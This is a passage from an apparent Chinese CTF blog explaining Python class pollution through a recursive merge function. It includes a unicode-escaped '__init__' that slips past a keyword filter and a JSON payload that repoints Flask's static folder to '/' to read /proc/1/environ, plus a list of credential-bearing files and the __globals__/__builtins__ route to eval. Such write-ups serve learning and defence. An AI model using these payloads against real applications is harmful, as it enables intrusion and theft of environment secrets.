language_">self</span>/environ  <span class="comment"># 这个文件包含了当前进程（即执行该命令的进程）的环境变量</span></span><br><span class="line"></span><br><span class="line">/etc/profile</span><br><span class="line"></span><br><span class="line">/etc/profile.d/*.sh</span><br><span class="line"></span><br><span class="line">~/.bash_profile</span><br><span class="line"></span><br><span class="line">~/.bashrc</span><br><span class="line"></span><br><span class="line">/etc/bashrc</span><br></pre></td></tr></table></figure></li></ol><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="*编码绕过"></a>*编码绕过</h3><ol><li>虽然这里使用的是通过check函数对象的<code>__globals__</code>属性来获取全局变量，但是也可以通过编码进行绕过，涉及到python中的unicode<ol><li>在 Python 3 中，字符串默认是 Unicode 字符串，使用 str 类型表示。你可以直接在字符串中使用 Unicode 字符</li><li>这里源码中有一个<code>json.loads()</code>是从字符串转换的，刚好可以利用<code>__init__ # \u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F</code></li></ol></li></ol><h3 id="静态目录写入-一个很不错的思路"><a href="#静态目录写入-一个很不错的思路" class="headerlink" title="*静态目录写入 -&gt; 一个很不错的思路"></a>*静态目录写入 -&gt; 一个很不错的思路</h3><ol><li><p>先看一眼payload吧</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;__init\u005f_&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Flask app 全局变量</p><ol><li>app 是 Flask 应用的实例，是一个 Flask 对象。通过创建 app 对象，我们可以定义路由、处理请求、设置配置等，从而构建一个完整的 Web 应用程序。</li><li>Flask app实例是整个应用的核心，负责处理用户的请求并返回相应的响应。可以通过 app.route 装饰器定义路由，将不同的 URL 请求映射到对应的处理函数上。</li><li>app 对象包含了大量的功能和方法，例如 route、run、add_url_rule 等，这些方法用于处理请求和设置应用的各种配置。</li><li>通过 app.run() 方法，我们可以在指定的主机和端口上启动 Flask 应用，使其监听并处理客户端的请求</li></ol></li><li><p>_static_folder 全局变量</p><ol><li>_static_folder 是 Flask 应用中用于<strong>指定静态文件的文件夹路径</strong>。静态文件通常包括 CSS、JavaScript、图像等，用于展示网页的样式和交互效果。</li><li>静态文件可以包含在 Flask 应用中，例如 CSS 文件用于设置网页样式，JavaScript 文件用于实现网页的交互功能，图像文件用于显示图形内容等。</li><li>在 Flask 中，可以通过 app.static_folder 属性来访问_static_folder，并指定存放静态文件的文件夹路径。默认情况下，静态文件存放在应用程序的根目录下的 static 文件夹中。</li><li>Flask 在处理请求时，会自动寻找静态文件的路径，并将静态文件发送给客户端，使网页能够正确地显示样式和图像</li></ol></li><li><p><em><strong>利用原理</strong></em>: <code>/static/proc/1/environ</code>：由于”_static_folder”:”&#x2F;“把静态目录直接设置为了根目录，所以根目录下<code>/proc/1/environ</code>可以通过访问静态目录<code>/static/proc/1/environ</code>访问</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> python pp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从原型链深入理解flask的ssti</title>
      <link href="/2024/11/12/%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3flask%E7%9A%84ssti/"/>
      <url>/2024/11/12/%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3flask%E7%9A%84ssti/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这一篇的ssti主要建立在原型链污染上，要求对jinja2的一些变量可控才可以，<em><strong>并不是常规的ssti思路</strong></em>，只适用于ssti+pp<br><em><strong>奇技淫巧和思路很妙</strong></em>，打开脑洞了</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> all in one </tag>
            
            <tag> ssti </tag>
            
            <tag> python pp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python原型链污染</title>
      <link href="/2024/11/11/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2024/11/11/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h2 id="纳尼？python还有原型链？"><a href="#纳尼？python还有原型链？" class="headerlink" title="纳尼？python还有原型链？"></a>纳尼？python还有原型链？</h2><blockquote><p>接触python以来一直以为就是类的模型，直到24的强网拟态中的见到后才直到，其实也是热门考点了</p></blockquote><h3 id="Python中的对象模型"><a href="#Python中的对象模型" class="headerlink" title="Python中的对象模型"></a>Python中的对象模型</h3><h4 id="实例对象与类对象"><a href="#实例对象与类对象" class="headerlink" title="实例对象与类对象"></a>实例对象与类对象</h4><ol><li><strong>对象 (Object)</strong><ol><li>一切皆对象。每个对象都有一个类型（或类）、一个值和一个标识。</li><li>对象的标识是对象的唯一标识符，可以通过 id() 函数获取。</li><li>对象的类型是对象所属的类，可以通过 type() 函数获取。</li><li>对象的值是对象的实际数据。</li></ol></li><li><strong>类 (Class)</strong><ol><li>类是对象的蓝图，定义了对象的属性和方法。</li><li>类可以继承其他类，从而获得父类的属性和方法。</li></ol></li><li><strong>实例 (Instance)</strong><ol><li>实例是类的具体对象，通过调用类的构造函数（通常是 <code>__init__</code> 方法）创建</li><li>实例有自己的属性和方法，这些属性和方法可以与类的其他实例不同</li></ol></li><li><em><strong>类对象与实例对象</strong></em><ol><li><strong>类对象</strong>是由 class 关键字定义的，用于创建实例对象。类对象可以包含属性（变量）和方法（函数），这些属性和方法可以被实例对象继承<ol><li>cpp中的静态变量就是python类对象的属性，类变量：属于类对象，所有实例对象共享同一个类变量</li></ol></li><li><strong>实例对象</strong>: 每个实例对象都是类对象的一个具体实例。实例对象在内存中是独立的，但它们共享类对象的属性和方法</li><li>访问权限<ol><li>类变量可以通过类对象和实例对象访问</li><li>实例变量只能通过实例对象访问</li></ol></li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="comment"># 1. 类属性</span></span><br><span class="line">    class_attribute = <span class="string">&quot;This is a class attribute&quot;</span></span><br><span class="line">    <span class="comment"># 2. 类方法: @classmethod 和 cls</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">class_method</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Class method called. Class name: <span class="subst">&#123;cls.__name__&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 实例方法: self</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="comment"># 4. 实例属性，在__init__或者实例确定后添加</span></span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">instance_method</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Instance method called. Value: <span class="subst">&#123;self.value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="getattr-setattr-and-delattr"><a href="#getattr-setattr-and-delattr" class="headerlink" title="getattr, setattr and delattr"></a>getattr, setattr and delattr</h4><blockquote><p>在 Python 中，有一些内置方法可以在对象中处理未找到的属性或方法。这些方法允许你在尝试访问不存在的属性或方法时提供自定义行为<br>python中的getter和setter都是实例方法</p></blockquote><ol><li><p><em><strong>所谓”getter1”: <code>__getattr__(self, name)</code></strong></em></p><ol><li>用途：当访问一个不存在的属性时，Python 会调用 <code>__getattr__</code> 方法</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">&#x27;age&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">30</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> AttributeError(<span class="string">f&quot;&#x27;<span class="subst">&#123;self.__class__.__name__&#125;</span>&#x27; object has no attribute &#x27;<span class="subst">&#123;name&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">obj = MyClass()</span><br><span class="line"><span class="built_in">print</span>(obj.age)  <span class="comment"># 输出: 30</span></span><br><span class="line"><span class="built_in">print</span>(obj.name)  <span class="comment"># 抛出 AttributeError</span></span><br></pre></td></tr></table></figure></li><li><p><em><strong>所谓”getter2”: <code>__getattribute__(self, name)</code></strong></em></p><ol><li>当访问任何属性时，Python 会先调用 <code>__getattribute__</code> 方法。这个方法比 <code>__getattr__</code> 更早被调用</li><li><strong>递归调用</strong>: 在 <code>__getattribute__</code> 中，直接访问属性会导致递归调用(再次调用自己的该函数)，因此通常使用 <code>super().__getattribute__(name)</code> 来避免递归</li></ol></li><li><p><em><strong>所谓”setter1”: <code>__setattr__(self, name, value)</code></strong></em> –&gt; 装饰器？</p><ol><li>当设置一个属性时，Python 会调用 <code>__setattr__</code> 方法</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setattr__</span>(<span class="params">self, name, value</span>):</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">&#x27;age&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, <span class="built_in">int</span>):</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;Age must be an integer&quot;</span>)</span><br><span class="line">            <span class="built_in">super</span>().__setattr__(name, value)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">super</span>().__setattr__(name, value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    obj.age = <span class="string">&#x27;thirty&#x27;</span></span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)  <span class="comment"># 输出: Age must be an integer</span></span><br></pre></td></tr></table></figure></li><li><p><em><strong>所谓delattr: <code>__delattr__(self, name)</code></strong></em></p><ol><li>当使用del删除一个属性时，Python 会调用该方法</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__delattr__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">&#x27;age&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Deleting age attribute&quot;</span>)</span><br><span class="line">            <span class="built_in">super</span>().__delattr__(name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">super</span>().__delattr__(name)</span><br><span class="line"></span><br><span class="line">obj = MyClass()</span><br><span class="line">obj.age = <span class="number">30</span></span><br><span class="line"><span class="keyword">del</span> obj.age  <span class="comment"># 输出: Deleting age attribute</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="python原型链污染的来源"><a href="#python原型链污染的来源" class="headerlink" title="**python原型链污染的来源"></a>**python原型链污染的来源</h3><h4 id="基础特性"><a href="#基础特性" class="headerlink" title="基础特性"></a>基础特性</h4><ol><li><em><strong>唯一性</strong></em>: 类对象的唯一性: 在 Python 中，<strong>类对象是唯一的</strong>。当定义一个类时，Python 解释器会在内存中创建一个唯一的类对象，并将类的名称绑定到这个对象。这个类对象包含了类的所有属性和方法，在整个程序运行期间存在</li><li><em><strong>指向同一个类对象</strong></em>: 无论通过类名还是通过实例对象的 <code>__class__</code> 属性，都可以引用到同一个类对象。Python 使用引用机制来确保类对象的唯一性</li><li><em><strong>属性查找</strong></em><ol><li><strong><code>__dict__</code>属性</strong>: 每个类都有一个 <code>__dict__</code> 属性，它是一个字典，存储了类的属性和方法。每个实例也有一个 <code>__dict__</code> 属性，存储了实例的属性</li><li><strong>顺序</strong>: 实例字典 -&gt; 类字典 -&gt; 基类字典 -&gt; 内置方法<ol><li>对比一下js原型链: 对象通过 <code>__proto__</code> 属性链接到其原型对象。属性查找沿着原型链逐级向上查找，直到找到属性或到达原型链的顶端（null）</li></ol></li></ol></li></ol><h4 id="继承与方法解析顺序"><a href="#继承与方法解析顺序" class="headerlink" title="继承与方法解析顺序"></a>继承与方法解析顺序</h4><blockquote><p>在 Python 中，虽然没有像 JavaScript 那样的显式原型链（prototype chain），但 Python 使用了一种类似的机制，即继承机制和方法解析顺序（MRO, Method Resolution Order）。Python 中的类和对象可以<strong>通过继承关系形成一种链式结构</strong>，类似于 JavaScript 的原型链</p></blockquote><ol><li><p>类与对象：在 Python 中，一切皆对象，包括类本身。类定义创建一个类对象，而类实例化创建一个实例对象。每个类对象和实例对象都可以通过特殊属性 <code>__class__</code> 和 <code>__bases__</code> 访问其继承关系</p></li><li><p><em><strong>MRO</strong></em>: 方法解析顺序（MRO）决定了在多继承环境中搜索方法的顺序。MRO 是基于 C3 线性化算法实现的，确保继承关系和方法解析的唯一性和一致性</p><ol><li><strong>super()函数</strong>: 用于在子类中调用父类的方法，遵循 MRO 顺序</li><li><strong>广度优先</strong>: MRO 遵循“广度优先”策略，即优先从左到右查找同级父类的方法</li><li>详见C3线性化合并算法</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接以多继承的情况进行讲解吧</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">method</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;A method&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">method</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;B method&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">method</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;C method&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(B, C):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">d = D()</span><br><span class="line">d.method()  <span class="comment"># 输出: B method</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(D.mro())</span><br><span class="line"><span class="comment"># 根据 D(B, C)，首先检查 B，然后检查 C</span></span><br><span class="line"><span class="comment"># 输出: [&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;]</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="拼成big-picture"><a href="#拼成big-picture" class="headerlink" title="拼成big picture"></a>拼成big picture</h4><ol><li>通过类对象的唯一性和唯一指向性，如果在访问唯一类对象时进行merge的会将添加类对象的属性(只能添加，不能覆盖，还是涉及到一个地址指向的问题)，从而添加新的内容</li><li>在python中，原型链污染还有更加容易的利用变体，同时危害也更大</li></ol><h2 id="Python和Js不同之处"><a href="#Python和Js不同之处" class="headerlink" title="Python和Js不同之处"></a>Python和Js不同之处</h2><ol><li><p>Nodejs是对键值对的控制来进行污染，而Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法</p></li><li><p>注意在python中的object的属性是不可以被污染的</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">merge(evil_playload,<span class="built_in">object</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">object</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># TypeError: cannot set &#x27;flag&#x27; attribute of immutable type &#x27;object&#x27; 或者 TypeError: can&#x27;t set attributes of built-in/extension type &#x27;object&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="merge情况"><a href="#merge情况" class="headerlink" title="merge情况"></a>merge情况</h2><blockquote><p>由于Python中的类会继承父类中的属性，而类中声明（并不是实例中声明）的属性是唯一的，所以我们的目标就是这些在多个类、示例中仍然指向唯一的属性，如类中自定义属性及以__开头的内置属性等</p></blockquote><h3 id="情形解析"><a href="#情形解析" class="headerlink" title="情形解析"></a>情形解析</h3><ol><li>merge情况和node的一样，都是通过污染要覆盖或者添加的那个属性来实现</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="comment"># the dict has __getitem__</span></span><br><span class="line">            <span class="comment"># possible for pp</span></span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            <span class="comment"># the case when dst is a obj not a dict and owns the key k and v is a dict</span></span><br><span class="line">            <span class="comment"># not possible for pp</span></span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># the case when dst is an obj and v is not a dict OR dst has no key k</span></span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ctfer</span>:  </span><br><span class="line">    flag = <span class="string">&quot;flag&#123;fake_flag&#125;&quot;</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Delete</span>(<span class="title class_ inherited__">ctfer</span>):  </span><br><span class="line">    <span class="keyword">pass</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Chu0</span>(<span class="title class_ inherited__">ctfer</span>):  </span><br><span class="line">    <span class="keyword">pass</span>  </span><br><span class="line"></span><br><span class="line">ctf1 = Delete()  </span><br><span class="line">ctf2 = Chu0()  </span><br><span class="line">evil_playload = &#123;  </span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>:  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>:  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="string">&quot;flag&quot;</span>: <span class="string">&quot;flag&#123;really_flag&#125;&quot;</span>  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(ctf1.flag)  </span><br><span class="line"><span class="built_in">print</span>(ctf2.flag)  </span><br><span class="line">merge(evil_playload, ctf1)  </span><br><span class="line"><span class="built_in">print</span>(ctf1.flag)  </span><br><span class="line"><span class="built_in">print</span>(ctf2.flag)</span><br></pre></td></tr></table></figure><h3 id="payload解析"><a href="#payload解析" class="headerlink" title="payload解析"></a>payload解析</h3><ol><li><code>__class__</code> 是Python中每个对象都具有的一个属性，它指向对象的类(对象)</li><li><code>__base__</code> 是Python类对象的一个属性，指向当前类的父类</li><li>这里通过payload来覆盖&#x2F;增加类对象的变量</li></ol><h3 id="merge的局限性"><a href="#merge的局限性" class="headerlink" title="merge的局限性"></a>merge的局限性</h3><ol><li>在代码展示部分所给出的例子中，污染类属性是通过示例的__base__属性查找到其继承的父类，但是如果<em><strong>目标类与切入点类或实例没有继承关系时</strong></em>，这种方法就显得十分无力，无法污染到共同的类对象(object没办法)</li></ol><h2 id="python原型链污染绕过一些限制"><a href="#python原型链污染绕过一些限制" class="headerlink" title="python原型链污染绕过一些限制"></a>python原型链污染绕过一些限制</h2><h3 id="污染全局变量"><a href="#污染全局变量" class="headerlink" title="*污染全局变量"></a>*污染全局变量</h3><h4 id="python的内置变量和魔术方法"><a href="#python的内置变量和魔术方法" class="headerlink" title="*python的内置变量和魔术方法"></a>*python的内置变量和魔术方法</h4><ol><li><p>常见内置变量和魔术方法</p><ol><li>内置变量在原型链污染中比较常见</li><li><em><strong>一、关于<code>__init__</code>的注意点</strong></em><ol><li>在python中，对于类的内置方法如<code>__init__</code>这些来说，内置方法在并未重写时其数据类型为装饰器即wrapper_descriptor，只有在重写后才是函数function，<strong>普通函数对象拥有<code>__globals__</code>属性</strong>，这也就解释了为什么在SSTI中不是每一个类的<code>__init__</code>都有<code>__globals__</code>属性</li><li>重写这些方法时，你实际上是在定义一个新的普通函数，并将其绑定到类的相应方法名上</li></ol></li><li><em><strong>二、关于<code>__builtins__</code></strong></em><ol><li><p>这是一个特殊的<strong>模块</strong>，包含了 Python 解释器提供的所有内置函数、异常和其他对象</p></li><li><p><strong>默认导入</strong>: 每个 Python 程序中都是默认可用的该模块的，因此你可以在任何地方直接使用这些内置对象，而不需要显式导入</p>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 包含了常用的内置函数，如 print、len、type、int、str、list、dict 等。</span></span><br><span class="line"><span class="comment"># 2. 包含了所有标准异常，如 ValueError、TypeError、IndexError 等。</span></span><br><span class="line"><span class="comment"># 3. 包含了一些内置常量，如 True、False、None等</span></span><br></pre></td></tr></table></figure></li><li><p><strong>作用</strong>: 由于 eval 是一个内置函数，我们不能直接通过 <code>__globals__[&#39;eval&#39;]</code> 来访问它，但可以通过 <code>__builtins__</code> 来访问</p><ol><li><strong>REASON: Python的命名空间和作用域</strong></li></ol></li></ol></li><li><em><strong>三、关于<code>__import__</code>注意点</strong></em><ol><li>这是一个内置函数，用于动态导入模块。尽管通常我们使用 import 语句来导入模块，但<code>__import__</code>提供了一种更灵活的方式来动态地导入模块，特别是在模块名称是动态确定的情况下</li><li><code>__import__(name, globals=None, locals=None, fromlist=(), level=0)</code>函数原型</li></ol></li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__name___ <span class="comment"># 1. 当前模块的名称。如果是主模块（即直接运行的脚本），则 __name__ 的值为 &#x27;__main__&#x27; </span></span><br><span class="line"></span><br><span class="line">__file__ <span class="comment"># 2. 表示当前模块的文件路径</span></span><br><span class="line"></span><br><span class="line">__dict__ <span class="comment"># 3. 表示对象的属性字典</span></span><br><span class="line"></span><br><span class="line">__module__ <span class="comment"># 4. 表示类或函数所属的模块名称</span></span><br><span class="line"></span><br><span class="line">__globals__ <span class="comment"># 5. 与函数和方法对象相关联，全局信息存在字典里，只读字典</span></span><br><span class="line">   <span class="comment"># ref: https://docs.python.org/3/reference/datamodel.html</span></span><br><span class="line"></span><br><span class="line">__init__ <span class="comment"># 6. 初始化类，返回的类型是function</span></span><br><span class="line">    <span class="comment"># 关于.__init__.__globals__实际上是通过函数访问全局变量而不是初始化实例</span></span><br><span class="line"></span><br><span class="line">__builtins__ <span class="comment"># 7. 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span> <span class="comment"># 8. 内置方法: 动态导入模块</span></span><br><span class="line">    <span class="comment"># 调用示例</span></span><br><span class="line">    odule_name = <span class="string">&#x27;os&#x27;</span></span><br><span class="line">    os_module = <span class="built_in">__import__</span>(module_name)</span><br><span class="line">    <span class="built_in">print</span>(os_module.getcwd())  <span class="comment"># 输出当前工作目录</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="python命名空间和作用域"><a href="#python命名空间和作用域" class="headerlink" title="python命名空间和作用域"></a>python命名空间和作用域</h4><ol><li><em><strong>全局命名空间 (<code>__globals__</code>)</strong></em><ol><li>包含函数或模块的全局变量和对象。</li><li>例如，你在模块中定义的变量、函数、类等都存储在全局命名空间中。</li></ol></li><li><em><strong>内置命名空间 (<code>__builtins__</code>)</strong></em><ol><li>包含所有内置函数和对象，如 print、len、eval 等。</li><li>这些内置对象在每个 Python 程序中都是默认可用的，但它们并不直接存储在全局命名空间中</li></ol></li><li>Q: 为什么在ssti(串台一下)中为什么 <code>__globals__[&#39;eval&#39;]</code> 会失败?<ol><li>A: eval 是一个内置函数，它存储在 <code>__builtins__</code> 模块中，而不是直接存储在全局命名空间中。</li></ol></li><li><em><strong>Solution<code>.__globals__.__builtins__[&#39;eval&#39;]</code></strong></em>: 通过 <code>__globals__[&#39;__builtins__&#39;]</code> 访问 <code>__builtins__</code> 模块，然后从中获取 eval 函数</li></ol><h4 id="globals-与payloads"><a href="#globals-与payloads" class="headerlink" title="__globals__与payloads"></a><code>__globals__</code>与payloads</h4><blockquote><p><code>__globals__</code>中具有的是当前模块的全局变量: 当前全局命名空间中的符号表（symbol 